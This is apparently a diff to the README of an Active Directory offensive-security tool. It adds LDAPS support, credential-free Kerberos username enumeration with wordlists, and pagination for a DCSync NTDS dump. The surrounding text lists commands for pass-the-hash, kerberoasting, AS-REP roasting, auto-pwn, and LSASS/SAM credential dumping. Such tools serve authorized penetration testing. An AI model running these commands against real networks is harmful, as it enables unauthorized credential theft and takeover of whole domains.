@@ -75,6 +75,7 @@ These work on every single command:
 | `--nt-hash` | | `OT_NT_HASH` | NTLM hash for Pass-the-Hash. The hash IS the password. |
 | `--ticket` | | `KRB5CCNAME` | Kerberos ticket cache file. For the "I already have a ticket" crowd. |
 | `--auth-method` | `-A` | | Auth method: `password` (default), `hash`, `ticket`. Pick your poison. |
+| `--ldaps` | | | Use LDAP over SSL (port 636). Supported on auto-pwn, reaper, enum, and related LDAP commands. |
 | `--verbose` | `-v` | | Verbosity: `-v` info, `-vv` debug, `-vvv` trace (prepare for a wall of text). |
 | `--output` | `-o` | | Output format: `text`, `json`, `csv`. Default: `text`. |
 | `--outfile` | `-O` | | Save output to file. For when you need receipts. |
@@ -144,6 +145,10 @@ ovt auto-pwn-preauth -H 10.10.10.1 -d corp.local
 
 # Stealth + stage limit
 ovt auto-pwn-preauth -H 10.10.10.1 -d corp.local --stealth --max-stage attack
+
+# LDAP-backed bootstrap with bounded concurrency and file override
+ovt auto-pwn-preauth -H 10.10.10.1 -d corp.local \
+  --userlist ./loot/valid_users.txt --use-ldap --concurrency 20
 ```
 
 Bootstrap sequence:
@@ -151,6 +156,8 @@ Bootstrap sequence:
 - `ovt enum anonymous`
 - `ovt rid --null-session`
 - pre-auth `snaffler` loot pass (writes `loot/preauth_snaffler_findings.json`)
+
+During bootstrap, preauth user enumeration now honors `--userlist`, `--use-ldap`, and `--concurrency`. If no list is supplied, it falls back to the embedded candidate set before continuing into the normal `pilot` stages.
 
 Then it transitions to normal `pilot` planner stages and continues as far as available access allows.
 
@@ -403,6 +410,13 @@ ovt kerberos roast --spn MSSQLSvc/db01.corp.local  # Target a specific SPN
 ovt kerberos asrep-roast -H 10.10.10.1 -d corp.local -u jsmith -p 'Summer2026!'
 ovt kerberos asrep-roast --userlist users.txt  # Optional list; falls back if missing
 
+# Zero-knowledge username enumeration - no creds required
+ovt kerberos user-enum -H 10.10.10.1 -d corp.local --output ./loot/valid_users.txt
+ovt kerberos user-enum -H 10.10.10.1 -d corp.local --use-ldap  # derive usernames via anonymous/null LDAP
+ovt kerberos user-enum -H 10.10.10.1 -d corp.local \
+  --userlist /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt \
+  --concurrency 20 --delay 100
+
 # Request a TGT (proof of authentication)
 ovt kerberos get-tgt -H 10.10.10.1 -d corp.local -u jsmith -p 'Summer2026!'
 
@@ -517,7 +531,7 @@ ovt graph export --output graph.json
 ovt graph export --output bloodhound.json --bloodhound
 ```
 
-`ovt graph view` renders the graph canvas with compact labels when you zoom in (and always for selected/high-value nodes), while full names stay readable in the node, edge, header, and detail panels. `ovt graph tree` renders a fully interactive domain -> object type -> object -> inbound/outbound relationship tree with rich human-readable detail panes. `ovt graph gui` starts a local Rust web server, indexes directory inputs as individual JSON choices, and opens a D3-powered browser UI that starts blank like BloodHound. Search boxes provide realtime source/destination suggestions, object-type filters narrow users/computers/groups/domains/GPOs/OUs/templates/CAs, path results render only the relevant nodes, and chunk budgets support `50`, `100`, `200`, `300`, `500`, `1000`, `2000`, `5000`, or `ALL` with an explicit warning prompt.
+`ovt graph view` renders the graph canvas with compact labels when you zoom in (and always for selected/high-value nodes), while full names stay readable in the node, edge, header, and detail panels. `ovt graph tree` renders a fully interactive domain -> object type -> object -> inbound/outbound relationship tree with rich human-readable detail panes. `ovt graph gui` starts a local Rust web server, indexes directory inputs as individual JSON choices, and opens a Three.js-powered WebGL browser UI that starts blank like BloodHound. Search boxes provide realtime source/destination suggestions, object-type filters narrow users/computers/groups/domains/GPOs/OUs/templates/CAs, path results render only the relevant nodes, and chunk budgets support `50`, `100`, `200`, `300`, `500`, `1000`, `2000`, `5000`, or `ALL` with an explicit warning prompt.
 
 ---
 
@@ -905,7 +919,7 @@ ovt module run-parallel sam-dump -t 10.10.10.10,10.10.10.11 --concurrency 5
 | `lsassy` | Dump | Credential dumping from LSASS memory |
 | `sam-dump` | Dump | Dump SAM registry hive (local account hashes) |
 | `lsa-dump` | Dump | Dump LSA secrets (service account credentials) |
-| `ntds-dump` | Dump | DCSync NTDS.dit secrets via MS-DRSR (single-user `{"user":"krbtgt"}` or full domain `{"all":true}`) |
+| `ntds-dump` | Dump | DCSync NTDS.dit secrets via MS-DRSR (single-user `{"user":"krbtgt"}` or full domain `{"all":true}`). Paginated high-watermark loop (500 obj/page, up to 100 pages) for large domains — cursor tracks across calls via uuidInvocIdSrc/usnvecTo. |
 | `bloodhound` | Enum | Collect LDAP data for BloodHound analysis |
 | `kerberoast` | Kerberos | Request TGS tickets for SPNs (Kerberoasting) |
 | `asreproast` | Kerberos | Request AS-REP for users with no pre-auth required |
